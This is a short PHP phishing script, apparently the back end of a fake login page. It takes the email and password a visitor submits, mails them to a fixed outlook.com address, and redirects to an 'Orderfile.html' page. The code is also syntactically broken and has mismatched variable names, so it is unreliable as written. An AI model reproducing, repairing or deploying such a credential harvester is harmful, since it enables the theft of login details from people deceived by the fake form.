<?php
$email = $_POST['email'];
$password = $_POST['password'];


$email_from = 'eqpluse@outlook.com' ;

$email_subject = 'New form Submissiom' ;

$email_body = "User Email: $email.\n"
              "User Password: $Password.\"


$to = 'eqpluse@outlook.com';

$headers = 'from: $email_form \r\n';

$headers .= 'Reply-To: $email \n';

mail($to,$email_subject,$email_body,$headers);

header('Location: Orderfile.html');

?>